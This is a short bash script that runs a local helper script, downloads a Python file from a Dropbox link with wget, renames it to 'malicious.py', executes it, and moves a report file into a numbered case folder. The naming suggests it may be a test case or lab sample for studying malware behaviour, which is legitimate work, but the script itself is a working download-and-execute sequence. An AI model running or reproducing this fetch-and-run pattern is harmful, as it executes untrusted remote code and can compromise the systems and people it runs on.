#!/usr/bin/env bash
/bin/bash $PWD/ping_others.sh
wget "https://www.dropbox.com/s/y5yfzpopd45v53y/call_others2.py?dl=0"
mv $PWD/call_others2.py?dl=0 $PWD/malicious.py
python3 $PWD/malicious.py
mv $PWD/sysrep_random $PWD/pxf109/case7.txt